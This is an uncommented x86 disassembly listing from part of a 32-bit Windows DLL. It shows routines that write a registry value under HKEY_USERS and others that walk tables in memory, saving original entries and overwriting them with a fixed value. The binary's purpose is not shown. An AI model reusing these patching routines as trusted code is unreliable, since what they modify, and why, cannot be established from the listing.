10008094:	89 45 ec             	mov    %eax,-0x14(%ebp)
10008097:	eb 11                	jmp    0x100080aa
10008099:	68 88 01 01 10       	push   $0x10010188
1000809e:	ff 75 fc             	push   -0x4(%ebp)
100080a1:	ff 15 00 e0 00 10    	call   *0x1000e000
100080a7:	89 5d ec             	mov    %ebx,-0x14(%ebp)
100080aa:	8d 45 ec             	lea    -0x14(%ebp),%eax
100080ad:	6a 04                	push   $0x4
100080af:	50                   	push   %eax
100080b0:	6a 04                	push   $0x4
100080b2:	53                   	push   %ebx
100080b3:	68 94 01 01 10       	push   $0x10010194
100080b8:	ff 75 fc             	push   -0x4(%ebp)
100080bb:	ff d7                	call   *%edi
100080bd:	03 75 e8             	add    -0x18(%ebp),%esi
100080c0:	8b 06                	mov    (%esi),%eax
100080c2:	83 c6 04             	add    $0x4,%esi
100080c5:	3b c3                	cmp    %ebx,%eax
100080c7:	89 45 e8             	mov    %eax,-0x18(%ebp)
100080ca:	74 11                	je     0x100080dd
100080cc:	50                   	push   %eax
100080cd:	56                   	push   %esi
100080ce:	6a 01                	push   $0x1
100080d0:	53                   	push   %ebx
100080d1:	68 a0 01 01 10       	push   $0x100101a0
100080d6:	ff 75 fc             	push   -0x4(%ebp)
100080d9:	ff d7                	call   *%edi
100080db:	eb 0e                	jmp    0x100080eb
100080dd:	68 a0 01 01 10       	push   $0x100101a0
100080e2:	ff 75 fc             	push   -0x4(%ebp)
100080e5:	ff 15 00 e0 00 10    	call   *0x1000e000
100080eb:	03 75 e8             	add    -0x18(%ebp),%esi
100080ee:	8b 06                	mov    (%esi),%eax
100080f0:	3b c3                	cmp    %ebx,%eax
100080f2:	74 1a                	je     0x1000810e
100080f4:	f6 45 f4 04          	testb  $0x4,-0xc(%ebp)
100080f8:	74 14                	je     0x1000810e
100080fa:	83 c6 04             	add    $0x4,%esi
100080fd:	50                   	push   %eax
100080fe:	56                   	push   %esi
100080ff:	6a 01                	push   $0x1
10008101:	53                   	push   %ebx
10008102:	68 b0 01 01 10       	push   $0x100101b0
10008107:	ff 75 fc             	push   -0x4(%ebp)
1000810a:	ff d7                	call   *%edi
1000810c:	eb 0e                	jmp    0x1000811c
1000810e:	68 b0 01 01 10       	push   $0x100101b0
10008113:	ff 75 fc             	push   -0x4(%ebp)
10008116:	ff 15 00 e0 00 10    	call   *0x1000e000
1000811c:	ff 75 f0             	push   -0x10(%ebp)
1000811f:	ff 75 e4             	push   -0x1c(%ebp)
10008122:	6a 03                	push   $0x3
10008124:	53                   	push   %ebx
10008125:	68 e4 01 01 10       	push   $0x100101e4
1000812a:	ff 75 f8             	push   -0x8(%ebp)
1000812d:	ff d7                	call   *%edi
1000812f:	8b 75 e4             	mov    -0x1c(%ebp),%esi
10008132:	c7 45 f4 01 00 00 00 	movl   $0x1,-0xc(%ebp)
10008139:	56                   	push   %esi
1000813a:	ff 15 c0 e0 00 10    	call   *0x1000e0c0
10008140:	ff 75 f8             	push   -0x8(%ebp)
10008143:	ff 15 48 e0 00 10    	call   *0x1000e048
10008149:	89 5d f8             	mov    %ebx,-0x8(%ebp)
1000814c:	ff 75 fc             	push   -0x4(%ebp)
1000814f:	ff 15 48 e0 00 10    	call   *0x1000e048
10008155:	8b 45 f4             	mov    -0xc(%ebp),%eax
10008158:	5f                   	pop    %edi
10008159:	5e                   	pop    %esi
1000815a:	5b                   	pop    %ebx
1000815b:	c9                   	leave
1000815c:	c3                   	ret
1000815d:	55                   	push   %ebp
1000815e:	8b ec                	mov    %esp,%ebp
10008160:	81 ec 08 01 00 00    	sub    $0x108,%esp
10008166:	53                   	push   %ebx
10008167:	56                   	push   %esi
10008168:	57                   	push   %edi
10008169:	33 db                	xor    %ebx,%ebx
1000816b:	68 ff 00 00 00       	push   $0xff
10008170:	8d 85 f8 fe ff ff    	lea    -0x108(%ebp),%eax
10008176:	53                   	push   %ebx
10008177:	50                   	push   %eax
10008178:	89 5d fc             	mov    %ebx,-0x4(%ebp)
1000817b:	e8 96 51 00 00       	call   0x1000d316
10008180:	83 c4 0c             	add    $0xc,%esp
10008183:	8d 85 f8 fe ff ff    	lea    -0x108(%ebp),%eax
10008189:	68 00 02 01 10       	push   $0x10010200
1000818e:	50                   	push   %eax
1000818f:	ff 15 d8 e0 00 10    	call   *0x1000e0d8
10008195:	8b 35 e0 e0 00 10    	mov    0x1000e0e0,%esi
1000819b:	bf 3c 00 01 10       	mov    $0x1001003c,%edi
100081a0:	8d 85 f8 fe ff ff    	lea    -0x108(%ebp),%eax
100081a6:	57                   	push   %edi
100081a7:	50                   	push   %eax
100081a8:	ff d6                	call   *%esi
100081aa:	8d 85 f8 fe ff ff    	lea    -0x108(%ebp),%eax
100081b0:	68 60 02 01 10       	push   $0x10010260
100081b5:	50                   	push   %eax
100081b6:	ff d6                	call   *%esi
100081b8:	8d 85 f8 fe ff ff    	lea    -0x108(%ebp),%eax
100081be:	57                   	push   %edi
100081bf:	50                   	push   %eax
100081c0:	ff d6                	call   *%esi
100081c2:	8d 85 f8 fe ff ff    	lea    -0x108(%ebp),%eax
100081c8:	68 c0 01 01 10       	push   $0x100101c0
100081cd:	50                   	push   %eax
100081ce:	ff d6                	call   *%esi
100081d0:	8d 45 f8             	lea    -0x8(%ebp),%eax
100081d3:	50                   	push   %eax
100081d4:	68 1f 00 02 00       	push   $0x2001f
100081d9:	8d 85 f8 fe ff ff    	lea    -0x108(%ebp),%eax
100081df:	53                   	push   %ebx
100081e0:	50                   	push   %eax
100081e1:	68 03 00 00 80       	push   $0x80000003
100081e6:	ff 15 3c e0 00 10    	call   *0x1000e03c
100081ec:	85 c0                	test   %eax,%eax
100081ee:	75 26                	jne    0x10008216
100081f0:	53                   	push   %ebx
100081f1:	53                   	push   %ebx
100081f2:	53                   	push   %ebx
100081f3:	53                   	push   %ebx
100081f4:	68 cc 01 01 10       	push   $0x100101cc
100081f9:	ff 75 f8             	push   -0x8(%ebp)
100081fc:	ff 15 40 e0 00 10    	call   *0x1000e040
10008202:	85 c0                	test   %eax,%eax
10008204:	75 07                	jne    0x1000820d
10008206:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
1000820d:	ff 75 f8             	push   -0x8(%ebp)
10008210:	ff 15 48 e0 00 10    	call   *0x1000e048
10008216:	8b 45 fc             	mov    -0x4(%ebp),%eax
10008219:	5f                   	pop    %edi
1000821a:	5e                   	pop    %esi
1000821b:	5b                   	pop    %ebx
1000821c:	c9                   	leave
1000821d:	c3                   	ret
1000821e:	80 3d 38 08 01 10 01 	cmpb   $0x1,0x10010838
10008225:	0f 84 a2 00 00 00    	je     0x100082cd
1000822b:	68 88 01 01 10       	push   $0x10010188
10008230:	e8 c7 f3 ff ff       	call   0x100075fc
10008235:	c7 04 24 94 01 01 10 	movl   $0x10010194,(%esp)
1000823c:	e8 bb f3 ff ff       	call   0x100075fc
10008241:	c7 04 24 a0 01 01 10 	movl   $0x100101a0,(%esp)
10008248:	e8 af f3 ff ff       	call   0x100075fc
1000824d:	c7 04 24 b0 01 01 10 	movl   $0x100101b0,(%esp)
10008254:	e8 a3 f3 ff ff       	call   0x100075fc
10008259:	c7 04 24 c0 01 01 10 	movl   $0x100101c0,(%esp)
10008260:	e8 97 f3 ff ff       	call   0x100075fc
10008265:	c7 04 24 cc 01 01 10 	movl   $0x100101cc,(%esp)
1000826c:	e8 8b f3 ff ff       	call   0x100075fc
10008271:	c7 04 24 e4 01 01 10 	movl   $0x100101e4,(%esp)
10008278:	e8 7f f3 ff ff       	call   0x100075fc
1000827d:	c7 04 24 00 02 01 10 	movl   $0x10010200,(%esp)
10008284:	e8 73 f3 ff ff       	call   0x100075fc
10008289:	c7 04 24 0c 02 01 10 	movl   $0x1001020c,(%esp)
10008290:	e8 67 f3 ff ff       	call   0x100075fc
10008295:	c7 04 24 1c 02 01 10 	movl   $0x1001021c,(%esp)
1000829c:	e8 5b f3 ff ff       	call   0x100075fc
100082a1:	c7 04 24 34 02 01 10 	movl   $0x10010234,(%esp)
100082a8:	e8 4f f3 ff ff       	call   0x100075fc
100082ad:	c7 04 24 50 02 01 10 	movl   $0x10010250,(%esp)
100082b4:	e8 43 f3 ff ff       	call   0x100075fc
100082b9:	c7 04 24 60 02 01 10 	movl   $0x10010260,(%esp)
100082c0:	e8 29 f3 ff ff       	call   0x100075ee
100082c5:	59                   	pop    %ecx
100082c6:	c6 05 38 08 01 10 01 	movb   $0x1,0x10010838
100082cd:	c3                   	ret
100082ce:	55                   	push   %ebp
100082cf:	8b ec                	mov    %esp,%ebp
100082d1:	81 ec b0 00 00 00    	sub    $0xb0,%esp
100082d7:	8b 45 0c             	mov    0xc(%ebp),%eax
100082da:	56                   	push   %esi
100082db:	85 c0                	test   %eax,%eax
100082dd:	75 04                	jne    0x100082e3
100082df:	6a 57                	push   $0x57
100082e1:	eb 0d                	jmp    0x100082f0
100082e3:	8b 75 08             	mov    0x8(%ebp),%esi
100082e6:	83 20 00             	andl   $0x0,(%eax)
100082e9:	83 fe 0a             	cmp    $0xa,%esi
100082ec:	73 08                	jae    0x100082f6
100082ee:	6a e6                	push   $0xffffffe6
100082f0:	58                   	pop    %eax
100082f1:	e9 15 01 00 00       	jmp    0x1000840b
100082f6:	53                   	push   %ebx
100082f7:	57                   	push   %edi
100082f8:	6a 14                	push   $0x14
100082fa:	8d 45 ec             	lea    -0x14(%ebp),%eax
100082fd:	5f                   	pop    %edi
100082fe:	57                   	push   %edi
100082ff:	6a 00                	push   $0x0
10008301:	50                   	push   %eax
10008302:	e8 0f 50 00 00       	call   0x1000d316
10008307:	83 c4 0c             	add    $0xc,%esp
1000830a:	89 75 ec             	mov    %esi,-0x14(%ebp)
1000830d:	ff 15 dc e0 00 10    	call   *0x1000e0dc
10008313:	8b d8                	mov    %eax,%ebx
10008315:	c7 45 08 be ff ff ff 	movl   $0xffffffbe,0x8(%ebp)
1000831c:	0f b6 c3             	movzbl %bl,%eax
1000831f:	83 e8 04             	sub    $0x4,%eax
10008322:	0f 84 92 00 00 00    	je     0x100083ba
10008328:	48                   	dec    %eax
10008329:	74 16                	je     0x10008341
1000832b:	48                   	dec    %eax
1000832c:	0f 85 d4 00 00 00    	jne    0x10008406
10008332:	8d 45 ec             	lea    -0x14(%ebp),%eax
10008335:	57                   	push   %edi
10008336:	50                   	push   %eax
10008337:	68 de 89 00 10       	push   $0x100089de
1000833c:	e9 95 00 00 00       	jmp    0x100083d6
10008341:	be 9c 00 00 00       	mov    $0x9c,%esi
10008346:	8d 85 50 ff ff ff    	lea    -0xb0(%ebp),%eax
1000834c:	56                   	push   %esi
1000834d:	6a 00                	push   $0x0
1000834f:	50                   	push   %eax
10008350:	e8 c1 4f 00 00       	call   0x1000d316
10008355:	83 c4 0c             	add    $0xc,%esp
10008358:	8d 85 50 ff ff ff    	lea    -0xb0(%ebp),%eax
1000835e:	89 b5 50 ff ff ff    	mov    %esi,-0xb0(%ebp)
10008364:	50                   	push   %eax
10008365:	ff 15 b8 e0 00 10    	call   *0x1000e0b8
1000836b:	33 c0                	xor    %eax,%eax
1000836d:	8a c7                	mov    %bh,%al
1000836f:	0f b6 c0             	movzbl %al,%eax
10008372:	83 e8 00             	sub    $0x0,%eax
10008375:	74 37                	je     0x100083ae
10008377:	48                   	dec    %eax
10008378:	74 1a                	je     0x10008394
1000837a:	48                   	dec    %eax
1000837b:	0f 85 85 00 00 00    	jne    0x10008406
10008381:	66 83 7d e4 00       	cmpw   $0x0,-0x1c(%ebp)
10008386:	8d 45 ec             	lea    -0x14(%ebp),%eax
10008389:	57                   	push   %edi
1000838a:	50                   	push   %eax
1000838b:	74 1a                	je     0x100083a7
1000838d:	68 88 88 00 10       	push   $0x10008888
10008392:	eb 42                	jmp    0x100083d6
10008394:	66 83 7d e4 02       	cmpw   $0x2,-0x1c(%ebp)
10008399:	8d 45 ec             	lea    -0x14(%ebp),%eax
1000839c:	57                   	push   %edi
1000839d:	50                   	push   %eax
1000839e:	73 07                	jae    0x100083a7
100083a0:	68 dc 85 00 10       	push   $0x100085dc
100083a5:	eb 2f                	jmp    0x100083d6
100083a7:	68 32 87 00 10       	push   $0x10008732
100083ac:	eb 28                	jmp    0x100083d6
100083ae:	8d 45 ec             	lea    -0x14(%ebp),%eax
100083b1:	57                   	push   %edi
100083b2:	50                   	push   %eax
100083b3:	68 f5 84 00 10       	push   $0x100084f5
100083b8:	eb 1c                	jmp    0x100083d6
100083ba:	e8 c1 42 00 00       	call   0x1000c680
100083bf:	84 c0                	test   %al,%al
100083c1:	74 09                	je     0x100083cc
100083c3:	c7 45 08 e2 ff ff ff 	movl   $0xffffffe2,0x8(%ebp)
100083ca:	eb 3a                	jmp    0x10008406
100083cc:	8d 45 ec             	lea    -0x14(%ebp),%eax
100083cf:	57                   	push   %edi
100083d0:	50                   	push   %eax
100083d1:	68 0e 84 00 10       	push   $0x1000840e
100083d6:	e8 f3 12 00 00       	call   0x100096ce
100083db:	83 c4 0c             	add    $0xc,%esp
100083de:	89 45 08             	mov    %eax,0x8(%ebp)
100083e1:	85 c0                	test   %eax,%eax
100083e3:	75 21                	jne    0x10008406
100083e5:	57                   	push   %edi
100083e6:	ff 15 c0 e1 00 10    	call   *0x1000e1c0
100083ec:	8b f0                	mov    %eax,%esi
100083ee:	59                   	pop    %ecx
100083ef:	85 f6                	test   %esi,%esi
100083f1:	74 13                	je     0x10008406
100083f3:	8d 45 ec             	lea    -0x14(%ebp),%eax
100083f6:	57                   	push   %edi
100083f7:	50                   	push   %eax
100083f8:	56                   	push   %esi
100083f9:	e8 1e 4f 00 00       	call   0x1000d31c
100083fe:	8b 45 0c             	mov    0xc(%ebp),%eax
10008401:	83 c4 0c             	add    $0xc,%esp
10008404:	89 30                	mov    %esi,(%eax)
10008406:	8b 45 08             	mov    0x8(%ebp),%eax
10008409:	5f                   	pop    %edi
1000840a:	5b                   	pop    %ebx
1000840b:	5e                   	pop    %esi
1000840c:	c9                   	leave
1000840d:	c3                   	ret
1000840e:	55                   	push   %ebp
1000840f:	8b ec                	mov    %esp,%ebp
10008411:	6a ff                	push   $0xffffffff
10008413:	68 78 e4 00 10       	push   $0x1000e478
10008418:	68 00 c6 00 10       	push   $0x1000c600
1000841d:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
10008423:	50                   	push   %eax
10008424:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
1000842b:	83 ec 20             	sub    $0x20,%esp
1000842e:	53                   	push   %ebx
1000842f:	56                   	push   %esi
10008430:	57                   	push   %edi
10008431:	89 65 e8             	mov    %esp,-0x18(%ebp)
10008434:	8b 75 0c             	mov    0xc(%ebp),%esi
10008437:	33 ff                	xor    %edi,%edi
10008439:	3b f7                	cmp    %edi,%esi
1000843b:	0f 84 a2 00 00 00    	je     0x100084e3
10008441:	83 7d 10 14          	cmpl   $0x14,0x10(%ebp)
10008445:	0f 85 98 00 00 00    	jne    0x100084e3
1000844b:	89 7e 08             	mov    %edi,0x8(%esi)
1000844e:	89 7e 04             	mov    %edi,0x4(%esi)
10008451:	c7 45 e0 e3 ff ff ff 	movl   $0xffffffe3,-0x20(%ebp)
10008458:	89 7d fc             	mov    %edi,-0x4(%ebp)
1000845b:	ff 36                	push   (%esi)
1000845d:	ff 75 08             	push   0x8(%ebp)
10008460:	e8 45 15 00 00       	call   0x100099aa
10008465:	59                   	pop    %ecx
10008466:	59                   	pop    %ecx
10008467:	89 45 dc             	mov    %eax,-0x24(%ebp)
1000846a:	3b c7                	cmp    %edi,%eax
1000846c:	75 08                	jne    0x10008476
1000846e:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
10008472:	6a ec                	push   $0xffffffec
10008474:	eb 6f                	jmp    0x100084e5
10008476:	8b 88 08 01 00 00    	mov    0x108(%eax),%ecx
1000847c:	89 4d d0             	mov    %ecx,-0x30(%ebp)
1000847f:	89 7d d8             	mov    %edi,-0x28(%ebp)
10008482:	ba 20 02 00 00       	mov    $0x220,%edx
10008487:	3b 79 30             	cmp    0x30(%ecx),%edi
1000848a:	73 4e                	jae    0x100084da
1000848c:	8b 41 48             	mov    0x48(%ecx),%eax
1000848f:	8b 04 f8             	mov    (%eax,%edi,8),%eax
10008492:	89 45 d4             	mov    %eax,-0x2c(%ebp)
10008495:	80 78 01 02          	cmpb   $0x2,0x1(%eax)
10008499:	72 23                	jb     0x100084be
1000849b:	83 78 08 20          	cmpl   $0x20,0x8(%eax)
1000849f:	75 1d                	jne    0x100084be
100084a1:	83 c0 0c             	add    $0xc,%eax
100084a4:	8b 18                	mov    (%eax),%ebx
100084a6:	81 e3 f0 0f 00 00    	and    $0xff0,%ebx
100084ac:	3b da                	cmp    %edx,%ebx
100084ae:	75 0e                	jne    0x100084be
100084b0:	89 46 04             	mov    %eax,0x4(%esi)
100084b3:	8b 18                	mov    (%eax),%ebx
100084b5:	89 5e 08             	mov    %ebx,0x8(%esi)
100084b8:	89 10                	mov    %edx,(%eax)
100084ba:	83 65 e0 00          	andl   $0x0,-0x20(%ebp)
100084be:	81 ff e8 03 00 00    	cmp    $0x3e8,%edi
100084c4:	77 14                	ja     0x100084da
100084c6:	47                   	inc    %edi
100084c7:	89 7d d8             	mov    %edi,-0x28(%ebp)
100084ca:	eb bb                	jmp    0x10008487
100084cc:	6a 01                	push   $0x1
100084ce:	58                   	pop    %eax
100084cf:	c3                   	ret
100084d0:	8b 65 e8             	mov    -0x18(%ebp),%esp
100084d3:	c7 45 e0 e4 ff ff ff 	movl   $0xffffffe4,-0x20(%ebp)
100084da:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
100084de:	8b 45 e0             	mov    -0x20(%ebp),%eax
100084e1:	eb 03                	jmp    0x100084e6
100084e3:	6a 57                	push   $0x57
100084e5:	58                   	pop    %eax
100084e6:	8b 4d f0             	mov    -0x10(%ebp),%ecx
100084e9:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
100084f0:	5f                   	pop    %edi
100084f1:	5e                   	pop    %esi
100084f2:	5b                   	pop    %ebx
100084f3:	c9                   	leave
100084f4:	c3                   	ret
100084f5:	55                   	push   %ebp
100084f6:	8b ec                	mov    %esp,%ebp
100084f8:	6a ff                	push   $0xffffffff
100084fa:	68 88 e4 00 10       	push   $0x1000e488
100084ff:	68 00 c6 00 10       	push   $0x1000c600
10008504:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
1000850a:	50                   	push   %eax
1000850b:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
10008512:	83 ec 20             	sub    $0x20,%esp
10008515:	53                   	push   %ebx
10008516:	56                   	push   %esi
10008517:	57                   	push   %edi
10008518:	89 65 e8             	mov    %esp,-0x18(%ebp)
1000851b:	8b 75 0c             	mov    0xc(%ebp),%esi
1000851e:	33 ff                	xor    %edi,%edi
10008520:	3b f7                	cmp    %edi,%esi
10008522:	0f 84 a2 00 00 00    	je     0x100085ca
10008528:	83 7d 10 14          	cmpl   $0x14,0x10(%ebp)
1000852c:	0f 85 98 00 00 00    	jne    0x100085ca
10008532:	89 7e 08             	mov    %edi,0x8(%esi)
10008535:	89 7e 04             	mov    %edi,0x4(%esi)
10008538:	c7 45 e0 e3 ff ff ff 	movl   $0xffffffe3,-0x20(%ebp)
1000853f:	89 7d fc             	mov    %edi,-0x4(%ebp)
10008542:	ff 36                	push   (%esi)
10008544:	ff 75 08             	push   0x8(%ebp)
10008547:	e8 5e 14 00 00       	call   0x100099aa
1000854c:	59                   	pop    %ecx
1000854d:	59                   	pop    %ecx
1000854e:	89 45 dc             	mov    %eax,-0x24(%ebp)
10008551:	3b c7                	cmp    %edi,%eax
10008553:	75 08                	jne    0x1000855d
10008555:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
10008559:	6a ec                	push   $0xffffffec
1000855b:	eb 6f                	jmp    0x100085cc
1000855d:	8b 88 2c 01 00 00    	mov    0x12c(%eax),%ecx
10008563:	89 4d d0             	mov    %ecx,-0x30(%ebp)
10008566:	89 7d d8             	mov    %edi,-0x28(%ebp)
10008569:	ba 20 02 00 00       	mov    $0x220,%edx
1000856e:	3b 79 3c             	cmp    0x3c(%ecx),%edi
10008571:	73 4e                	jae    0x100085c1
10008573:	8b 41 58             	mov    0x58(%ecx),%eax
10008576:	8b 04 f8             	mov    (%eax,%edi,8),%eax
10008579:	89 45 d4             	mov    %eax,-0x2c(%ebp)
1000857c:	80 78 01 02          	cmpb   $0x2,0x1(%eax)
10008580:	72 23                	jb     0x100085a5
10008582:	83 78 08 20          	cmpl   $0x20,0x8(%eax)
10008586:	75 1d                	jne    0x100085a5
10008588:	83 c0 0c             	add    $0xc,%eax
1000858b:	8b 18                	mov    (%eax),%ebx
1000858d:	81 e3 f0 0f 00 00    	and    $0xff0,%ebx
10008593:	3b da                	cmp    %edx,%ebx
10008595:	75 0e                	jne    0x100085a5
10008597:	89 46 04             	mov    %eax,0x4(%esi)
1000859a:	8b 18                	mov    (%eax),%ebx
1000859c:	89 5e 08             	mov    %ebx,0x8(%esi)
1000859f:	89 10                	mov    %edx,(%eax)
100085a1:	83 65 e0 00          	andl   $0x0,-0x20(%ebp)
100085a5:	81 ff e8 03 00 00    	cmp    $0x3e8,%edi
100085ab:	77 14                	ja     0x100085c1
100085ad:	47                   	inc    %edi
100085ae:	89 7d d8             	mov    %edi,-0x28(%ebp)
100085b1:	eb bb                	jmp    0x1000856e
100085b3:	6a 01                	push   $0x1
100085b5:	58                   	pop    %eax
100085b6:	c3                   	ret
100085b7:	8b 65 e8             	mov    -0x18(%ebp),%esp
100085ba:	c7 45 e0 e4 ff ff ff 	movl   $0xffffffe4,-0x20(%ebp)
100085c1:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
100085c5:	8b 45 e0             	mov    -0x20(%ebp),%eax
100085c8:	eb 03                	jmp    0x100085cd
100085ca:	6a 57                	push   $0x57
100085cc:	58                   	pop    %eax
100085cd:	8b 4d f0             	mov    -0x10(%ebp),%ecx
100085d0:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
100085d7:	5f                   	pop    %edi
100085d8:	5e                   	pop    %esi
100085d9:	5b                   	pop    %ebx
100085da:	c9                   	leave
100085db:	c3                   	ret
100085dc:	55                   	push   %ebp
100085dd:	8b ec                	mov    %esp,%ebp
100085df:	6a ff                	push   $0xffffffff
100085e1:	68 98 e4 00 10       	push   $0x1000e498
100085e6:	68 00 c6 00 10       	push   $0x1000c600
100085eb:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
100085f1:	50                   	push   %eax
100085f2:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
100085f9:	83 ec 2c             	sub    $0x2c,%esp
100085fc:	53                   	push   %ebx
100085fd:	56                   	push   %esi
100085fe:	57                   	push   %edi
100085ff:	89 65 e8             	mov    %esp,-0x18(%ebp)
10008602:	8b 75 0c             	mov    0xc(%ebp),%esi
10008605:	33 db                	xor    %ebx,%ebx
10008607:	3b f3                	cmp    %ebx,%esi
10008609:	0f 84 11 01 00 00    	je     0x10008720
1000860f:	83 7d 10 14          	cmpl   $0x14,0x10(%ebp)
10008613:	0f 85 07 01 00 00    	jne    0x10008720
10008619:	89 5e 08             	mov    %ebx,0x8(%esi)
1000861c:	89 5e 04             	mov    %ebx,0x4(%esi)
1000861f:	c7 45 e0 e3 ff ff ff 	movl   $0xffffffe3,-0x20(%ebp)
10008626:	89 5d fc             	mov    %ebx,-0x4(%ebp)
10008629:	ff 36                	push   (%esi)
1000862b:	ff 75 08             	push   0x8(%ebp)
1000862e:	e8 77 13 00 00       	call   0x100099aa
10008633:	59                   	pop    %ecx
10008634:	59                   	pop    %ecx
10008635:	89 45 dc             	mov    %eax,-0x24(%ebp)
10008638:	3b c3                	cmp    %ebx,%eax
1000863a:	75 04                	jne    0x10008640
1000863c:	6a ec                	push   $0xffffffec
1000863e:	eb 43                	jmp    0x10008683
10008640:	68 f0 02 01 10       	push   $0x100102f0
10008645:	ff 75 08             	push   0x8(%ebp)
10008648:	e8 1c 15 00 00       	call   0x10009b69
1000864d:	89 45 d4             	mov    %eax,-0x2c(%ebp)
10008650:	68 d4 02 01 10       	push   $0x100102d4
10008655:	ff 75 08             	push   0x8(%ebp)
10008658:	e8 0c 15 00 00       	call   0x10009b69
1000865d:	83 c4 10             	add    $0x10,%esp
10008660:	89 45 d8             	mov    %eax,-0x28(%ebp)
10008663:	39 5d d4             	cmp    %ebx,-0x2c(%ebp)
10008666:	0f 84 96 00 00 00    	je     0x10008702
1000866c:	3b c3                	cmp    %ebx,%eax
1000866e:	0f 84 8e 00 00 00    	je     0x10008702
10008674:	ff 75 dc             	push   -0x24(%ebp)
10008677:	ff 55 d4             	call   *-0x2c(%ebp)
1000867a:	89 45 d0             	mov    %eax,-0x30(%ebp)
1000867d:	3b c3                	cmp    %ebx,%eax
1000867f:	75 0c                	jne    0x1000868d
10008681:	6a e1                	push   $0xffffffe1
10008683:	58                   	pop    %eax
10008684:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
10008688:	e9 96 00 00 00       	jmp    0x10008723
1000868d:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
10008694:	8b f8                	mov    %eax,%edi
10008696:	89 7d c4             	mov    %edi,-0x3c(%ebp)
10008699:	33 d2                	xor    %edx,%edx
1000869b:	89 55 cc             	mov    %edx,-0x34(%ebp)
1000869e:	b9 20 02 00 00       	mov    $0x220,%ecx
100086a3:	3b 57 40             	cmp    0x40(%edi),%edx
100086a6:	73 40                	jae    0x100086e8
100086a8:	8b 47 5c             	mov    0x5c(%edi),%eax
100086ab:	8b 04 d0             	mov    (%eax,%edx,8),%eax
100086ae:	89 45 c8             	mov    %eax,-0x38(%ebp)
100086b1:	80 78 01 02          	cmpb   $0x2,0x1(%eax)
100086b5:	72 23                	jb     0x100086da
100086b7:	83 78 08 20          	cmpl   $0x20,0x8(%eax)
100086bb:	75 1d                	jne    0x100086da
100086bd:	83 c0 0c             	add    $0xc,%eax
100086c0:	8b 18                	mov    (%eax),%ebx
100086c2:	81 e3 f0 0f 00 00    	and    $0xff0,%ebx
100086c8:	3b d9                	cmp    %ecx,%ebx
100086ca:	75 0e                	jne    0x100086da
100086cc:	89 46 04             	mov    %eax,0x4(%esi)
100086cf:	8b 18                	mov    (%eax),%ebx
100086d1:	89 5e 08             	mov    %ebx,0x8(%esi)
100086d4:	89 08                	mov    %ecx,(%eax)
100086d6:	83 65 e0 00          	andl   $0x0,-0x20(%ebp)
100086da:	81 fa e8 03 00 00    	cmp    $0x3e8,%edx
100086e0:	77 06                	ja     0x100086e8
100086e2:	42                   	inc    %edx
100086e3:	89 55 cc             	mov    %edx,-0x34(%ebp)
100086e6:	eb bb                	jmp    0x100086a3
100086e8:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
100086ec:	e8 02 00 00 00       	call   0x100086f3
100086f1:	eb 24                	jmp    0x10008717
100086f3:	8b 45 dc             	mov    -0x24(%ebp),%eax
100086f6:	05 c8 00 00 00       	add    $0xc8,%eax
100086fb:	50                   	push   %eax
100086fc:	ff 55 d8             	call   *-0x28(%ebp)
100086ff:	c3                   	ret
10008700:	eb 15                	jmp    0x10008717
10008702:	6a e0                	push   $0xffffffe0
10008704:	e9 7a ff ff ff       	jmp    0x10008683
10008709:	6a 01                	push   $0x1
1000870b:	58                   	pop    %eax
1000870c:	c3                   	ret
1000870d:	8b 65 e8             	mov    -0x18(%ebp),%esp
10008710:	c7 45 e0 e4 ff ff ff 	movl   $0xffffffe4,-0x20(%ebp)
10008717:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
1000871b:	8b 45 e0             	mov    -0x20(%ebp),%eax
1000871e:	eb 03                	jmp    0x10008723
10008720:	6a 57                	push   $0x57
10008722:	58                   	pop    %eax
10008723:	8b 4d f0             	mov    -0x10(%ebp),%ecx
10008726:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
1000872d:	5f                   	pop    %edi
1000872e:	5e                   	pop    %esi
1000872f:	5b                   	pop    %ebx
10008730:	c9                   	leave
10008731:	c3                   	ret
10008732:	55                   	push   %ebp
10008733:	8b ec                	mov    %esp,%ebp
10008735:	6a ff                	push   $0xffffffff
10008737:	68 b0 e4 00 10       	push   $0x1000e4b0
1000873c:	68 00 c6 00 10       	push   $0x1000c600
10008741:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
10008747:	50                   	push   %eax
10008748:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
1000874f:	83 ec 2c             	sub    $0x2c,%esp
10008752:	53                   	push   %ebx
10008753:	56                   	push   %esi
10008754:	57                   	push   %edi
10008755:	89 65 e8             	mov    %esp,-0x18(%ebp)
10008758:	8b 75 0c             	mov    0xc(%ebp),%esi
1000875b:	33 db                	xor    %ebx,%ebx
1000875d:	3b f3                	cmp    %ebx,%esi
1000875f:	0f 84 11 01 00 00    	je     0x10008876
10008765:	83 7d 10 14          	cmpl   $0x14,0x10(%ebp)
10008769:	0f 85 07 01 00 00    	jne    0x10008876
1000876f:	89 5e 08             	mov    %ebx,0x8(%esi)
10008772:	89 5e 04             	mov    %ebx,0x4(%esi)
10008775:	c7 45 e0 e3 ff ff ff 	movl   $0xffffffe3,-0x20(%ebp)
1000877c:	89 5d fc             	mov    %ebx,-0x4(%ebp)
1000877f:	ff 36                	push   (%esi)
10008781:	ff 75 08             	push   0x8(%ebp)
10008784:	e8 21 12 00 00       	call   0x100099aa
10008789:	59                   	pop    %ecx
1000878a:	59                   	pop    %ecx
1000878b:	89 45 dc             	mov    %eax,-0x24(%ebp)
1000878e:	3b c3                	cmp    %ebx,%eax
10008790:	75 04                	jne    0x10008796
10008792:	6a ec                	push   $0xffffffec
10008794:	eb 43                	jmp    0x100087d9
